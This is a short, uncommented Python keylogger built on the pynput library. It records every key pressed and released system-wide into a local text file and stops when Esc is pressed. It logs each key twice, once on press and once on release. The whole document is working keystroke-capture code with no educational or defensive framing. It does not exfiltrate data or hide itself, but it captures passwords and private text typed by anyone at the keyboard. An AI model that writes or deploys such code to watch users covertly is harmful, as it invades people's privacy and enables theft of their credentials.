import os
from pynput import keyboard

# File path and name
file_path = 'keystrokes.txt'

def on_press(key):
    try:
        with open(file_path, 'a') as f:
            f.write('[{}]'.format(key.char))
    except AttributeError:
        if key == keyboard.Key.esc:
            return False
        elif key == keyboard.Key.space:
            with open(file_path, 'a') as f:
                f.write('[SPACE]')
        else:
            with open(file_path, 'a') as f:
                f.write('[{}]'.format(key))
    except Exception as e:
        print("Error occurred while writing to file:", str(e))

def on_release(key):
    if key == keyboard.Key.esc:
        return False
    else:
        try:
            with open(file_path, 'a') as f:
                f.write('[{}]'.format(key.char))
        except AttributeError:
            if key == keyboard.Key.space:
                with open(file_path, 'a') as f:
                    f.write('[SPACE]')
            else:
                with open(file_path, 'a') as f:
                    f.write('[{}]'.format(key))
        except Exception as e:
            print("Error occurred while writing to file:", str(e))

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()